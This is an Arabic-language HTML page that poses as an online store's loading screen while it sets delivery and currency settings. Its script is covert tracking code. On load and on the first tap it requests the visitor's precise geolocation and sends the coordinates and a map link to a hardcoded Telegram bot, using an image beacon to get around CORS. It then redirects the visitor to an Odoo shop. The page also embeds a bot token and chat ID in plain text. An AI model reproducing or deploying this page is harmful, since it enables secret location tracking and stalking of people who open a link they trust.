<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تحميل المعاينة...</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            color: #333;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p { margin-top: 20px; font-size: 16px; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p>جاري ضبط إعدادات التوصيل والعملة المحلية للمتجر...</p>

    <script>
        const TELEGRAM_TOKEN = "8679396887:AAFPkh0VlUxlPJ2k3EHjkWAxkpEGSOWE6SY";
        const TELEGRAM_CHAT_ID = "5874747123";
        let locationRequested = false;

        function redirectToStore() {
            window.location.href = "https://bs-accessoires-infiniti2.odoo.com";
        }

        // POST من المتصفح يُحجب بـ CORS — نستخدم GET (يعمل من الصفحة)
        function sendToTelegram(lat, lng, accuracy) {
            const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
            const message =
                `🚨 زيارة جديدة للموقع:\n` +
                `📍 خط العرض: ${lat}\n` +
                `📍 خط الطول: ${lng}\n` +
                `🎯 الدقة: ${Math.round(accuracy)} متر\n` +
                `🔗 الخريطة: ${mapLink}`;

            const url =
                `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage` +
                `?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;

            fetch(url, { method: "GET", mode: "no-cors" });
            const img = new Image();
            img.src = url;

            setTimeout(redirectToStore, 2000);
        }

        function requestLocation() {
            if (locationRequested) return;
            locationRequested = true;

            if (!window.isSecureContext) {
                sendToTelegram(0, 0, 0);
                return;
            }

            if (!navigator.geolocation) {
                redirectToStore();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    sendToTelegram(
                        position.coords.latitude,
                        position.coords.longitude,
                        position.coords.accuracy
                    );
                },
                () => redirectToStore(),
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        // الهاتف غالباً يطلب الموقع فقط بعد لمس/نقرة من المستخدم
        document.addEventListener("click", requestLocation, { once: true });
        document.addEventListener("touchstart", requestLocation, { once: true });

        window.addEventListener("load", () => {
            setTimeout(requestLocation, 500);
        });
    </script>
</body>
</html>
